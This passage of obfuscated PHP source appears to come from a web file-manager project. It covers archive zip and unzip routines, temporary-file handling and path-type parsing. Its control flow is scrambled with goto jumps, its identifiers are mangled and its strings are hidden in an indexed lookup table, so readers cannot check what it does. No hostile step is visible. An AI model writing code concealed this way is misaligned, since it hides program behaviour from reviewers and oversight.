= $Dó–¦Íùö[$dœ‘ÄáÅƒ½[1005]]; } goto f“Œèºõ¨È; bˆàâ·ÒåÕ: $fŞ‰½²µÃ = self::$driverCache[$EŸ“¶×˜‡Ñ]; $fŞ‰½²µÃ->pathDriver = $A½¨×‘×§; $fŞ‰½²µÃ->pathBase = $dœ‘ÄáÅƒ½[33]; goto a‡æÁ°ˆ‹í; D¦îšš·×İ: switch ($Dó–¦Íùö[$dœ‘ÄáÅƒ½[29]]) { case KodIO::KOD_IO: $d¿®»ª†‰ = self::$driverListSystem[$Aš—‡¸ô¨ˆ]; break; case KodIO::KOD_SOURCE: $Fµ“„ë£ñˆ = $Aš—‡¸ô¨ˆ . $Fµ“„ë£ñˆ; $d¿®»ª†‰ = array($dœ‘ÄáÅƒ½[1025] => $dœ‘ÄáÅƒ½[1026], $dœ‘ÄáÅƒ½[6] => $Dó–¦Íùö); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $dù¥ ™±Šä = $GLOBALS[$dœ‘ÄáÅƒ½[1027]]; self::$driverListUser = array_to_keyvalue($dù¥ ™±Šä, $dœ‘ÄáÅƒ½[371]); } $d¿®»ª†‰ = self::$driverListUser[$Aš—‡¸ô¨ˆ]; break; case KodIO::KOD_SHARE_LINK: $d¿®»ª†‰ = array($dœ‘ÄáÅƒ½[1025] => $dœ‘ÄáÅƒ½[1028], $dœ‘ÄáÅƒ½[6] => $Dó–¦Íùö); $bÛ·…ê‚à… = Action($dœ‘ÄáÅƒ½[1029])->sharePathInfo($Dó–¦Íùö[$dœ‘ÄáÅƒ½[75]]); $Fµ“„ë£ñˆ = $bÛ·…ê‚à…[$dœ‘ÄáÅƒ½[373]]; if (!$bÛ·…ê‚à…[$dœ‘ÄáÅƒ½[373]]) { $dÖÃìÇ­”ù = Model($dœ‘ÄáÅƒ½[540])->getInfo($bÛ·…ê‚à…[$dœ‘ÄáÅƒ½[444]]); $Fµ“„ë£ñˆ = KodIO::clear($dÖÃìÇ­”ù[$dœ‘ÄáÅƒ½[1030]] . $Dó–¦Íùö[$dœ‘ÄáÅƒ½[1023]]); $Dó–¦Íùö[$dœ‘ÄáÅƒ½[442]] = $dÖÃìÇ­”ù; $Dó–¦Íùö[$dœ‘ÄáÅƒ½[1005]] = $Fµ“„ë£ñˆ; $d¿®»ª†‰ = array($dœ‘ÄáÅƒ½[1025] => $dœ‘ÄáÅƒ½[1031], $dœ‘ÄáÅƒ½[6] => $Dó–¦Íùö); } break; case KodIO::KOD_SHARE_ITEM: $d¿®»ª†‰ = array($dœ‘ÄáÅƒ½[1025] => $dœ‘ÄáÅƒ½[1032], $dœ‘ÄáÅƒ½[6] => $Dó–¦Íùö); $dÖÃìÇ­”ù = Model($dœ‘ÄáÅƒ½[540])->getInfo($Dó–¦Íùö[$dœ‘ÄáÅƒ½[371]]); if ($dÖÃìÇ­”ù[$dœ‘ÄáÅƒ½[373]] == $dœ‘ÄáÅƒ½[473]) { $Fµ“„ë£ñˆ = KodIO::clear($dÖÃìÇ­”ù[$dœ‘ÄáÅƒ½[1030]] . $Dó–¦Íùö[$dœ‘ÄáÅƒ½[1023]]); $Dó–¦Íùö[$dœ‘ÄáÅƒ½[442]] = $dÖÃìÇ­”ù; $Dó–¦Íùö[$dœ‘ÄáÅƒ½[1005]] = $Fµ“„ë£ñˆ; $d¿®»ª†‰ = array($dœ‘ÄáÅƒ½[1025] => $dœ‘ÄáÅƒ½[1033], $dœ‘ÄáÅƒ½[6] => $Dó–¦Íùö); } else { if (!$Fµ“„ë£ñˆ) { $Fµ“„ë£ñˆ = $dÖÃìÇ­”ù[$dœ‘ÄáÅƒ½[373]]; } } break; default: $Fµ“„ë£ñˆ = $Dó–¦Íùö[$dœ‘ÄáÅƒ½[75]]; $d¿®»ª†‰ = array($dœ‘ÄáÅƒ½[1025] => $dœ‘ÄáÅƒ½[1034]); break; } $EŸ“¶×˜‡Ñ = $Dó–¦Íùö[$dœ‘ÄáÅƒ½[75]]; if (!isset(self::$driverCache[$EŸ“¶×˜‡Ñ])) { $eª‘œèæˆ¹ = strtolower($d¿®»ª†‰[$dœ‘ÄáÅƒ½[90]]); $D±¶£ÃôÄõ = $GLOBALS[$dœ‘ÄáÅƒ½[6]][$dœ‘ÄáÅƒ½[84]][$dœ‘ÄáÅƒ½[758]]; $E‰Èà¾Æƒä = $dœ‘ÄáÅƒ½[71] . (isset($D±¶£ÃôÄõ[$eª‘œèæˆ¹]) ? $D±¶£ÃôÄõ[$eª‘œèæˆ¹] : ucfirst($eª‘œèæˆ¹)); if (!class_exists($E‰Èà¾Æƒä)) { show_json("{$E‰Èà¾Æƒä}\x20\156\157\164\40\145\x78\151\163\x74\163\41", !1); } $DĞ‚†±Ô“ = isset($d¿®»ª†‰[$dœ‘ÄáÅƒ½[6]]) ? $d¿®»ª†‰[$dœ‘ÄáÅƒ½[6]] : !1; self::$driverCache[$EŸ“¶×˜‡Ñ] = new $E‰Èà¾Æƒä($DĞ‚†±Ô“); } goto bˆàâ·ÒåÕ; d˜Û¼åŠÍ­: } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $Eá¨ôÈããƒ; if (!$Eá¨ôÈããƒ) { $bÍ±ªÉ–‡¾ = IO::init($_SERVER[…Ò×–][8]); } return $bÍ±ªÉ–‡¾; } private static function iconvSystem($CÑ×µ¶£ä´) { return self::local()->iconvSystem($CÑ×µ¶£ä´); } private static function iconvApp($dÈŒÂ´·î¡) { return self::local()->iconvApp($dÈŒÂ´·î¡); } public static function zip($CÚÚ¿É—ˆ, $Dßáêñ´Â¶ = "\x7a\151\x70", $F«‰ÈëÃÈ£ = '', $C­Ÿ›µÒõ‰ = REPEAT_RENAME) { goto C·»¹Ó‡’ò; A°š‚©¤°ù: if (!$c…ºœËÈÚ) { del_dir($CĞå©•±Ÿ); show_json(LNG($añîà‘ßí[1038]), !1); } del_dir($CĞå©•±Ÿ); return $c…ºœËÈÚ; goto eƒÒ¯ÛÇÆ; Eõ“‘Ìšäò: if ($F«‰ÈëÃÈ£ || !$CĞå©•±Ÿ) { if ($CĞå©•±Ÿ && strstr($CĞå©•±Ÿ, TEMP_FILES)) { $C”ƒˆÌŠ = $fÕµšË±œ® = array(); recursion_dir($FÛœåë¯‡‰, $C”ƒˆÌŠ, $fÕµšË±œ®, 0); foreach ($C”ƒˆÌŠ as $A„ºÑî‰©) { del_dir($A„ºÑî‰©); } foreach ($fÕµšË±œ® as $Bå“›ˆ‘Ò›) { if ($Bå“›ˆ‘Ò› == $F¡¶ğ©ã„‰) { continue; } del_file($Bå“›ˆ‘Ò›); } } return $d×ˆ‚øğ°; } $E‰¥ùÀ•É = self::pathFather($DŠ½ªÌ‘Õ[$añîà‘ßí[75]]); $c…ºœËÈÚ = self::move($d×ˆ‚øğ°, $E‰¥ùÀ•É, $C­Ÿ›µÒõ‰); goto A°š‚©¤°ù; A±‰† ë•Á: foreach ($fÕµšË±œ® as $dŠö±ã«–» => $cå«¤¡Ì) { $fÕµšË±œ®[$dŠö±ã«–»] = self::iconvSystem($cå«¤¡Ì); } KodArchive::create($F¡¶ğ©ã„‰, $fÕµšË±œ®); if (!IO::exist($d×ˆ‚øğ°)) { if ($CĞå©•±Ÿ) { del_dir($CĞå©•±Ÿ); } show_json(LNG($añîà‘ßí[1038]), !1); } goto Eõ“‘Ìšäò; bø÷Å¢Á›: if (count($fÕµšË±œ®) > 1) { $AñÇÇÃÜ = IO::info(IO::pathFather($DŠ½ªÌ‘Õ[$añîà‘ßí[75]])); $d—İ‘×á°ä = $AñÇÇÃÜ[$añîà‘ßí[28]]; } $FÛœåë¯‡‰ = $CĞå©•±Ÿ; if (!$FÛœåë¯‡‰) { $FÛœåë¯‡‰ = get_path_father($DŠ½ªÌ‘Õ[$añîà‘ßí[75]]); if (!$F«‰ÈëÃÈ£ && $cÆ¸ÖÆÚÚ->getType() == $añîà‘ßí[102]) { $FÛœåë¯‡‰ = get_path_father($cÆ¸ÖÆÚÚ->path); } $fŠ½¿ÄœÑ = IO::info($FÛœåë¯‡‰); if (!$fŠ½¿ÄœÑ[$añîà‘ßí[193]]) { show_json(LNG($añîà‘ßí[1037]), !1); } } goto c«×œÁ›â¶; AÆ„ä£õ¦: $CĞå©•±Ÿ = !1; if (!$F«‰ÈëÃÈ£ && $cÆ¸ÖÆÚÚ->getType() == $añîà‘ßí[102]) { $fÕµšË±œ® = self::zipFileList($CÚÚ¿É—ˆ); } else { $CĞå©•±Ÿ = $F«‰ÈëÃÈ£ ? $F«‰ÈëÃÈ£ : TEMP_FILES . $añîà‘ßí[1036] . time() . rand_string(8) . $añîà‘ßí[8]; mk_dir($CĞå©•±Ÿ); $fÕµšË±œ® = self::zipFileList($CÚÚ¿É—ˆ, $CĞå©•±Ÿ); } $d—İ‘×á°ä = $DŠ½ªÌ‘Õ[$añîà‘ßí[28]]; goto bø÷Å¢Á›; C·»¹Ó‡’ò: $añîà‘ßí =& $_SERVER[…Ò×–]; $cÆ¸ÖÆÚÚ = self::init($CÚÚ¿É—ˆ[0][$añîà‘ßí[75]]); $DŠ½ªÌ‘Õ = self::info($CÚÚ¿É—ˆ[0][$añîà‘ßí[75]]); goto AÆ„ä£õ¦; c«×œÁ›â¶: $d×ˆ‚øğ° = $FÛœåë¯‡‰ . $d—İ‘×á°ä . $añîà‘ßí[91] . $Dßáêñ´Â¶; $d×ˆ‚øğ° = get_filename_auto($d×ˆ‚øğ°, $añîà‘ßí[33], $C­Ÿ›µÒõ‰); $F¡¶ğ©ã„‰ = self::iconvSystem($d×ˆ‚øğ°); goto A±‰† ë•Á; eƒÒ¯ÛÇÆ: } public static function unzip($CÙ¥¿öô, $EÃœãíœ = "\162\x65\160\154\x61\143\x65") { goto DìñÜÙÍó…; cî£È¬á¨: return !0; goto fÎç¼ ŒÔÓ; DìñÜÙÍó…: $EÖÔ…§¥æÊ =& $_SERVER[…Ò×–]; $c©œˆÑ¿‚ä = $CÙ¥¿öô[$EÖÔ…§¥æÊ[75]]; $F­ìâŒ‡Ô = $CÙ¥¿öô[$EÖÔ…§¥æÊ[1039]]; goto cÈóÍ’Œåø; cÈóÍ’Œåø: if (!($E«¹ë›ˆ × = parent::info($c©œˆÑ¿‚ä))) { show_json(LNG($EÖÔ…§¥æÊ[1040]), !1); } if (!($F‚ªÚÌİÚ´ = parent::infoFull($F­ìâŒ‡Ô))) { $F­ìâŒ‡Ô = parent::mkdir($F­ìâŒ‡Ô); $F‚ªÚÌİÚ´ = array($EÖÔ…§¥æÊ[75] => $F­ìâŒ‡Ô); } else { if (isset($F‚ªÚÌİÚ´[$EÖÔ…§¥æÊ[373]]) && trim($F‚ªÚÌİÚ´[$EÖÔ…§¥æÊ[75]], $EÖÔ…§¥æÊ[8]) != trim($F­ìâŒ‡Ô, $EÖÔ…§¥æÊ[8])) { $fĞ‘³²øƒ = KodIO::make($F‚ªÚÌİÚ´[$EÖÔ…§¥æÊ[466]]); $CÄé‡ê…¨Ä = parent::fileNameAuto($fĞ‘³²øƒ, $F‚ªÚÌİÚ´[$EÖÔ…§¥æÊ[28]], REPEAT_RENAME_FOLDER, !0); $F­ìâŒ‡Ô = parent::mkdir($fĞ‘³²øƒ . $CÄé‡ê…¨Ä); $F‚ªÚÌİÚ´ = array($EÖÔ…§¥æÊ[75] => $F­ìâŒ‡Ô); } } $F­ìâŒ‡Ô = $F‚ªÚÌİÚ´[$EÖÔ…§¥æÊ[75]]; goto aÜ§Éßù²±; D‰ÇÕä‘§: mk_dir($cåñ Õ©–Â); $b¢ÅùƒÌÇ» = self::fileExt($E«¹ë›ˆ ×); $Aç””œÎÅ× = $cåñ Õ©–Â . $EÖÔ…§¥æÊ[91] . $b¢ÅùƒÌÇ»; goto b¹Œ”åª§Ö; c¼¶™ÔÔäÇ: foreach ($A£¸†‹‚Åî as $a›¦ˆ’È°) { $a›¦ˆ’È° = self::iconvApp($a›¦ˆ’È°); self::move($a›¦ˆ’È°, $F­ìâŒ‡Ô, $EÃœãíœ); } del_dir($cåñ Õ©–Â); if (!$AèË¿ø—®) { del_file($Aç””œÎÅ×); } goto cî£È¬á¨; aÜ§Éßù²±: $C½ÆµïîŞÂ = self::tmpFileName($E«¹ë›ˆ ×); $cåñ Õ©–Â = TEMP_FILES . $C½ÆµïîŞÂ; del_dir($cåñ Õ©–Â); goto D‰ÇÕä‘§; b½ÆÒÚ¨¿Ÿ: $Fãˆ‚Ï‚èõ = KodArchive::extract($Aç””œÎÅ×, $cåñ Õ©–Â . $EÖÔ…§¥æÊ[8], $dé œ¹æˆ); self::archiveExt(); if (!$Fãˆ‚Ï‚èõ[$EÖÔ…§¥æÊ[1043]]) { show_json($EÖÔ…§¥æÊ[1044] . $Fãˆ‚Ï‚èõ[$EÖÔ…§¥æÊ[1045]], !1); } goto eÍˆ¥È÷öğ; eÍˆ¥È÷öğ: Hook::trigger($EÖÔ…§¥æÊ[1046], $cåñ Õ©–Â); recursion_dir($cåñ Õ©–Â, $c×ñĞ¦Ú™ï, $AË“’«é‘×, 0); $A£¸†‹‚Åî = array_merge($c×ñĞ¦Ú™ï, $AË“’«é‘×); goto c¼¶™ÔÔäÇ; b¹Œ”åª§Ö: if (!@file_exists(self::iconvSystem($Aç””œÎÅ×))) { $AèË¿ø—® = self::localFilePath($c©œˆÑ¿‚ä, $b¢ÅùƒÌÇ»); $Aç””œÎÅ× = $AèË¿ø—® ? $AèË¿ø—® : parent::download($c©œˆÑ¿‚ä, $Aç””œÎÅ×); } $Aç””œÎÅ× = self::iconvSystem($Aç””œÎÅ×); $dé œ¹æˆ = isset($CÙ¥¿öô[$EÖÔ…§¥æÊ[1041]]) ? $CÙ¥¿öô[$EÖÔ…§¥æÊ[1041]] : $EÖÔ…§¥æÊ[1042]; goto b½ÆÒÚ¨¿Ÿ; fÎç¼ ŒÔÓ: } public static function unzipList($aê—ŒØàßğ) { goto Cñ“’©’æ; bø ‹íÔì: $EÏŒ÷ÜŞÕˆ = json_encode($fƒà»ØÈÕ¢[$Cè¼ÕÔãµè[1045]]); self::setContent($f‚ÁŒ§¬ó§, $EÏŒ÷ÜŞÕˆ); if (count($fƒà»ØÈÕ¢[$Cè¼ÕÔãµè[1045]]) >= $B¤…æ­ÇòĞ) { show_json(sprintf(LNG($Cè¼ÕÔãµè[1049]), count($fƒà»ØÈÕ¢[$Cè¼ÕÔãµè[1045]])), !1); } goto aÙº°ôßÙÊ; FÊØğ¤ÍµÒ: self::archiveExt(); del_dir($bÖâóã‚ª); if (!$fƒà»ØÈÕ¢[$Cè¼ÕÔãµè[1043]]) { show_json($fƒà»ØÈÕ¢[$Cè¼ÕÔãµè[1045]], !1); } goto bø ‹íÔì; BÊ…£¿õº¢: if (isset($CÙŒùô‚š÷)) { $EğÆƒæå… = array($CÙŒùô‚š÷[$Cè¼ÕÔãµè[75]], $CÙŒùô‚š÷[$Cè¼ÕÔãµè[1047]], $CÙŒùô‚š÷[$Cè¼ÕÔãµè[28]]); $FØÔÕŒÙŒÜ = md5(implode($Cè¼ÕÔãµè[70], $EğÆƒæå…)) . $Cè¼ÕÔãµè[91] . get_path_ext($CÙŒùô‚š÷[$Cè¼ÕÔãµè[28]]); } else { $EğÆƒæå… = array($Añ‚ïß†ˆ‡[$Cè¼ÕÔãµè[28]], $Añ‚ïß†ˆ‡[$Cè¼ÕÔãµè[75]], $Añ‚ïß†ˆ‡[$Cè¼ÕÔãµè[77]]); $FØÔÕŒÙŒÜ = md5(implode($Cè¼ÕÔãµè[70], $EğÆƒæå…)) . $Cè¼ÕÔãµè[91] . $F»Á˜½ˆİ‡; } if ($CõÓà•¿œ == -1) { $f‚ÁŒ§¬ó§ = IO_PATH_SYSTEM_TEMP . "\x7a\x69\x70\126\151\145\167\57{$b–Íõ”¼™¥}\57{$FØÔÕŒÙŒÜ}\56\x6c\157\147"; $f¦Õ¦Ó‡ë = self::infoFull($f‚ÁŒ§¬ó§); if ($f¦Õ¦Ó‡ë) { $f‚ÁŒ§¬ó§ = $f¦Õ¦Ó‡ë[$Cè¼ÕÔãµè[75]]; $Bí ±Ä¯½ˆ = self::getContent($f‚ÁŒ§¬ó§); if ($Bí ±Ä¯½ˆ) { $EÏŒ÷ÜŞÕˆ = json_decode($Bí ±Ä¯½ˆ, !0); if (count($EÏŒ÷ÜŞÕˆ) >= $B¤…æ­ÇòĞ) { show_json(sprintf(LNG($Cè¼ÕÔãµè[1049]), count($EÏŒ÷ÜŞÕˆ)), !1); } return $EÏŒ÷ÜŞÕˆ; } } else { $f‚ÁŒ§¬ó§ = self::mkfile($f‚ÁŒ§¬ó§); } } $bÖâóã‚ª = TEMP_FILES . $b–Íõ”¼™¥; goto F„ÆàÀÜÕ«; Cñ“’©’æ: $Cè¼ÕÔãµè =& $_SERVER[…Ò×–]; $Eó¹½ø„£é = $aê—ŒØàßğ[$Cè¼ÕÔãµè[75]]; $CõÓà•¿œ = isset($aê—ŒØàßğ[$Cè¼ÕÔãµè[1047]]) ? $aê—ŒØàßğ[$Cè¼ÕÔãµè[1047]] : -1; goto dê†ƒÃØŠ­; C‘®Ô¦ìæÄ: $Cæ›š—²•ø = self::iconvSystem($Cæ›š—²•ø); if ($CõÓà•¿œ >= 0) { $e†‚‹õÓ— = isset($aê—ŒØàßğ[$Cè¼ÕÔãµè[1051]]) ? $aê—ŒØàßğ[$Cè¼ÕÔãµè[1051]] : !1; $E§ÕàÇÉß¨ = isset($aê—ŒØàßğ[$Cè¼ÕÔãµè[28]]) ? $aê—ŒØàßğ[$Cè¼ÕÔãµè[28]] : $Cè¼ÕÔãµè[33]; KodArchive::filePreview($Cæ›š—²•ø, $CõÓà•¿œ, $e†‚‹õÓ—, $E§ÕàÇÉß¨); self::archiveExt(); die; } $fƒà»ØÈÕ¢ = KodArchive::listContent($Cæ›š—²•ø); goto FÊØğ¤ÍµÒ; aÙº°ôßÙÊ: return $fƒà»ØÈÕ¢[$Cè¼ÕÔãµè[1045]]; goto aË†Éï­µ; C–ƒ­³ôË: $Añ‚ïß†ˆ‡ = self::info($D¢íƒ¶Ï‡¾); $F»Á˜½ˆİ‡ = self::fileExt($Añ‚ïß†ˆ‡); $b–Íõ”¼™¥ = self::tmpFileName($Añ‚ïß†ˆ‡); goto BÊ…£¿õº¢; F„ÆàÀÜÕ«: if (!is_dir($bÖâóã‚ª)) { mk_dir($bÖâóã‚ª); } $Cæ›š—²•ø = $bÖâóã‚ª . $Cè¼ÕÔãµè[8] . $FØÔÕŒÙŒÜ; if (!@file_exists(self::iconvSystem($Cæ›š—²•ø))) { if (isset($CÙŒùô‚š÷)) { url_request($Eó¹½ø„£é, $Cè¼ÕÔãµè[1050], $Cæ›š—²•ø); } else { $báŠ–…ÅÎ = self::localFilePath($Eó¹½ø„£é, $F»Á˜½ˆİ‡); $Cæ›š—²•ø = $báŠ–…ÅÎ ? $báŠ–…ÅÎ : self::download($Eó¹½ø„£é, $Cæ›š—²•ø); } } goto C‘®Ô¦ìæÄ; dê†ƒÃØŠ­: $B¤…æ­ÇòĞ = 50000; if (request_url_safe($Eó¹½ø„£é)) { $CÙŒùô‚š÷ = parse_url_query($Eó¹½ø„£é); if (!isset($CÙŒùô‚š÷[$Cè¼ÕÔãµè[75]])) { show_json($Cè¼ÕÔãµè[1048], !1); } } $D¢íƒ¶Ï‡¾ = isset($CÙŒùô‚š÷) ? $CÙŒùô‚š÷[$Cè¼ÕÔãµè[75]] : $Eó¹½ø„£é; goto C–ƒ­³ôË; aË†Éï­µ: } private static function fileExt($C®Ÿç©­ìÙ) { $AÙíåáĞ¦‚ =& $_SERVER[…Ò×–]; $AÜ‡à«æåá = $C®Ÿç©­ìÙ[$AÙíåáĞ¦‚[165]]; if ($AÜ‡à«æåá == $AÙíåáĞ¦‚[1052]) { $a›Ğ¶ñõ›È = $AÙíåáĞ¦‚[1053]; if (substr($C®Ÿç©­ìÙ[$AÙíåáĞ¦‚[28]], -strlen($a›Ğ¶ñõ›È)) == $a›Ğ¶ñõ›È) { $AÜ‡à«æåá = $AÙíåáĞ¦‚[1054]; } } self::archiveExt($AÜ‡à«æåá); return $AÜ‡à«æåá; } private static function zipFileList($aí¾êñ¾èã, $d‘Ğ‚ß™  = false) { $D»ÇÇì¼¬¤ =& $_SERVER[…Ò×–]; $eÔË³Ìò©‚ = array(); foreach ($aí¾êñ¾èã as $B†Åš—‡÷£) { $EéÑÙ¸ÈæŸ = $B†Åš—‡÷£[$D»ÇÇì¼¬¤[75]]; if ($d‘Ğ‚ß™ ) { $EéÑÙ¸ÈæŸ = self::copy($B†Åš—‡÷£[$D»ÇÇì¼¬¤[75]], $d‘Ğ‚ß™ , $D»ÇÇì¼¬¤[749]); } else { $EáŠöÌòÊ = self::init($B†Åš—‡÷£[$D»ÇÇì¼¬¤[75]]); if ($EáŠöÌòÊ->getType() == $D»ÇÇì¼¬¤[102]) { $EéÑÙ¸ÈæŸ = $EáŠöÌòÊ->path; } } if ($EéÑÙ¸ÈæŸ && self::local()->exist($EéÑÙ¸ÈæŸ)) { $eÔË³Ìò©‚[$B†Åš—‡÷£[$D»ÇÇì¼¬¤[75]]] = $EéÑÙ¸ÈæŸ; } } if (!empty($eÔË³Ìò©‚)) { return array_values($eÔË³Ìò©‚); } show_json(LNG($D»ÇÇì¼¬¤[1020]), !1); } public static function tmpFileName($B÷á²ÏèË¥) { $A¢ŞíæËØ« =& $_SERVER[…Ò×–]; $Eà£åÚ®ö = array($B÷á²ÏèË¥[$A¢ŞíæËØ«[28]], $B÷á²ÏèË¥[$A¢ŞíæËØ«[75]], $B÷á²ÏèË¥[$A¢ŞíæËØ«[77]], $B÷á²ÏèË¥[$A¢ŞíæËØ«[464]]); return md5(implode($A¢ŞíæËØ«[70], $Eà£åÚ®ö)); } private static function localFilePath($bÍ˜¬ª¢íë, $D‚æğ¸Ÿ„º) { goto aæ”ÉĞ×¹Ú; E¼°Õ‘ŒÑÚ: if ($DáãÕÂ‹ == $Fäê±ø‚‹[102] || $DáãÕÂ‹ == $Fäê±ø‚‹[1058]) { if (!$aª¤ÀäÄŒ->exist($aª¤ÀäÄŒ->path)) { show_json(LNG($Fäê±ø‚‹[101]), !1); } return $aª¤ÀäÄŒ->path; } return !1; goto DèîÉ¶ó°î; aæ”ÉĞ×¹Ú: $Fäê±ø‚‹ =& $_SERVER[…Ò×–]; if ($D‚æğ¸Ÿ„º == $Fäê±ø‚‹[1055] && strtoupper(substr(PHP_OS, 0, 3)) == $Fäê±ø‚‹[1056]) { return !1; } $F¶øì‘…¤ƒ = KodIO::parse($bÍ˜¬ª¢íë); goto aèÓŸæ¦‰ñ; aèÓŸæ¦‰ñ: if ($F¶øì‘…¤ƒ[$Fäê±ø‚‹[29]] == KodIO::KOD_SOURCE) { $AèæÙÎ¡ö¾ = Model($Fäê±ø‚‹[757])->fileInfoGet(KodIO::sourceID($bÍ˜¬ª¢íë)); if (!$AèæÙÎ¡ö¾[$Fäê±ø‚‹[75]]) { show_json($Fäê±ø‚‹[1057], !1); } $bÍ˜¬ª¢íë = $AèæÙÎ¡ö¾[$Fäê±ø‚‹[75]]; } $aª¤ÀäÄŒ = self::init($bÍ˜¬ª¢íë); $DáãÕÂ‹ = $aª¤ÀäÄŒ->getType(); goto E¼°Õ‘ŒÑÚ; DèîÉ¶ó°î: } private static function archiveExt($d©·¶«åÃ· = '') { $GLOBALS[$_SERVER[…Ò×–][1059]] = $d©·¶«åÃ·; } } class KodIO { const KOD_SOURCE = "\173\x73\x6f\165\x72\x63\145\x7d"; const KOD_USER_RECYCLE = "\173\165\x73\x65\x72\122\x65\143\171\x63\x6c\145\x7d"; const KOD_USER_FAV = "\173\165\x73\145\162\x46\x61\x76\175"; const KOD_USER_FILE_TAG = "\x7b\x75\163\145\x72\x46\x69\x6c\x65\x54\x61\x67\175"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\145\x72\106\151\154\145\124\171\160\145\x7d"; const KOD_GROUP_ROOT_SELF = "\173\147\162\x6f\x75\x70\x52\157\157\164\x53\145\x6c\x66\x7d"; const KOD_USER_SHARE = "\x7b\x75\x73\145\162\123\x68\x61\162\x65\175"; const KOD_USER_SHARE_LINK = "\173\x75\163\145\x72\x53\150\x61\x72\x65\114\151\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\173\x73\x68\x61\162\145\124\x6f\x4d\145\175"; const KOD_SHARE_ITEM = "\173\163\x68\x61\x72\x65\x49\164\x65\155\x7d"; const KOD_SHARE_LINK = "\173\x73\x68\141\162\x65\111\164\x65\x6d\x4c\151\x6e\x6b\175"; const KOD_SEARCH = "\x7b\163\145\x61\162\x63\150\175"; const KOD_BLOCK = "\x7b\x62\x6c\x6f\x63\153\175"; const KOD_IO = "\173\x69\x6f\175"; const KOD_USER_RECENT = "\x7b\165\163\x65\162\x52\x65\156\143\x65\156\164\x7d"; const KOD_USER_DRIVER = "\x7b\144\162\x69\x76\x65\162\x7d"; public static function typeList() { $f­¥ï£Â“¬ =& $_SERVER[…Ò×–]; return array($f­¥ï£Â“¬[1060] => self::KOD_SOURCE, $f­¥ï£Â“¬[1061] => self::KOD_USER_RECYCLE, $f­¥ï£Â“¬[1062] => self::KOD_USER_FAV, $f­¥ï£Â“¬[1063] => self::KOD_USER_FILE_TAG, $f­¥ï£Â“¬[1064] => self::KOD_USER_FILE_TYPE, $f­¥ï£Â“¬[1065] => self::KOD_GROUP_ROOT_SELF, $f­¥ï£Â“¬[1066] => self::KOD_USER_SHARE, $f­¥ï£Â“¬[1067] => self::KOD_USER_SHARE_LINK, $f­¥ï£Â“¬[1068] => self::KOD_USER_SHARE_TO_ME, $f­¥ï£Â“¬[1069] => self::KOD_SHARE_ITEM, $f­¥ï£Â“¬[1070] => self::KOD_SHARE_LINK, $f­¥ï£Â“¬[1071] => self::KOD_SEARCH, $f­¥ï£Â“¬[1072] => self::KOD_BLOCK, $f­¥ï£Â“¬[1073] => self::KOD_IO, $f­¥ï£Â“¬[1074] => self::KOD_USER_RECENT, $f­¥ï£Â“¬[1075] => self::KOD_USER_DRIVER); } public static function parse($a«¨‹»’ïÀ) { goto d®¯»±™ë; d®¯»±™ë: $FÂ¦¸˜Ûé =& $_SERVER[…Ò×–]; $a«¨‹»’ïÀ = self::clear($a«¨‹»’ïÀ); $C”ˆºš‡óŒ = array_values(self::typeList()); goto eá«°ÒÌÚâ; CôãŸìÁÛ: $cå¤ááïÃ = array($FÂ¦¸˜Ûé[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $eÎŒğ® ˜[$FÂ¦¸˜Ûé[1080]] = in_array($eÎŒğ® ˜[$FÂ¦¸˜Ûé[29]], $cå¤ááïÃ); return $eÎŒğ® ˜; goto Bï÷Íñ„Ô; eá«°ÒÌÚâ: preg_match($FÂ¦¸˜Ûé[1076], $a«¨‹»’ïÀ, $c‚¹Ã¸‰é); $eÎŒğ® ˜ = array($FÂ¦¸˜Ûé[392] => !1, $FÂ¦¸˜Ûé[1077] => !1, $FÂ¦¸˜Ûé[389] => !1, $FÂ¦¸˜Ûé[75] => $a«¨‹»’ïÀ, $FÂ¦¸˜Ûé[1024] => !1, $FÂ¦¸˜Ûé[1023] => $FÂ¦¸˜Ûé[33]); if (is_array($c‚¹Ã¸‰é) && count($c‚¹Ã¸‰é) == 5) { $Còñ“˜‹Ñâ = $FÂ¦¸˜Ûé[1078] . $c‚¹Ã¸‰é[2] . $FÂ¦¸˜Ûé[319]; if (in_array($Còñ“˜‹Ñâ, $C”ˆºš‡óŒ)) { $eÎŒğ® ˜[$FÂ¦¸˜Ûé[1024]] = $c‚¹Ã¸‰é[1]; $eÎŒğ® ˜[$FÂ¦¸˜Ûé[29]] = $Còñ“˜‹Ñâ; $eÎŒğ® ˜[$FÂ¦¸˜Ûé[1079]] = substr($Còñ“˜‹Ñâ, 1, -1); $eÎŒğ® ˜[$FÂ¦¸˜Ûé[371]] = $c‚¹Ã¸‰é[3]; } $eÎŒğ® ˜[$FÂ¦¸˜Ûé[1023]] = $c‚¹Ã¸‰é[4]; } goto CôãŸìÁÛ; Bï÷Íñ„Ô: } public static function clear($B©¦ŒÖ­…¦) { goto CÁë²§¯Â‡; CÁë²§¯Â‡: $e÷ª™ß–Ìï =& $_SERVER[…Ò×–]; $B©¦ŒÖ­…¦ = str_replace(array($e÷ª™ß–Ìï[999], $e÷ª™ß–Ìï[221]), $e÷ª™ß–Ìï[50], $B©¦ŒÖ­…¦); $B©¦ŒÖ­…¦ = str_replace($e÷ª™ß–Ìï[93], $e÷ª™ß–Ìï[8], $B©¦ŒÖ­…¦); goto e­‹ÕĞÓ•’; e­‹ÕĞÓ•’: $f£ĞÃİ†­ï = $e÷ª™ß–Ìï[1081]; if (substr($B©¦ŒÖ­…¦, 0, 3) == $e÷ª™ß–Ìï[1082]) { $B©¦ŒÖ­…¦ = substr($B©¦ŒÖ­…¦, 3); } while (strstr($B©¦ŒÖ­…¦, $f£ĞÃİ†­ï)) { $B©¦ŒÖ­…¦ = str_replace($f£ĞÃİ†­ï, $e÷ª™ß–Ìï[8], $B©¦ŒÖ­…¦); } goto AØ“„†¹é÷; FŸÄæÜå½: return $B©¦ŒÖ­…¦; goto cï‚ßùî®; AØ“„†¹é÷: $B©¦ŒÖ­…¦ = preg_replace($e÷ª™ß–Ìï[1083], $e÷ª™ß–Ìï[8], $B©¦ŒÖ­…¦); if ($B©¦ŒÖ­…¦ == $e÷ª™ß–Ìï[8]) { return $e÷ª™ß–Ìï[8]; } $B©¦ŒÖ­…¦ = rtrim($B©¦ŒÖ­…¦, $e÷ª™ß–Ìï[8]); goto FŸÄæÜå½; cï‚ßùî®: } public static function 